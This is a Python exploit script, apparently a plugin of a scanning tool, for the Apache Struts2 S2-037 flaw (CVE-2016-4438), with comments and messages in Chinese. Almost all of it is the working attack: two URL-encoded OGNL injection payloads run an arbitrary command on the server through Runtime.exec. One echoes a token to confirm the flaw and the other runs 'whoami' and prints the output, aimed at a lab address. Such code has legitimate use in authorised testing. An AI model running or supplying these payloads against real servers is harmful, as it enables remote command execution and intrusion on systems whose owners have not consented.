#!/usr/bin/env python3

'''
name: Struts2 S2-037漏洞，又名CVE-2016-4438漏洞
description: Struts2 S2-037漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_037_BaseVerify:
    def __init__(self, url):
        self.url = url 
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3"
                  }
        self.check_payload = '''/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=echo ''' + self.capta
        self.cmd_payload = '''/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=whoami'''
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if self.capta in check_req.text:
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                print('存在S2-037漏洞,执行whoami命令成功，结果为：', cmd_req.text)
                return True
            else:
                print('不存在S2-037漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_037 = S2_037_BaseVerify('http://192.168.30.242:8080/S2-037/orders/3')
    S2_037.run()
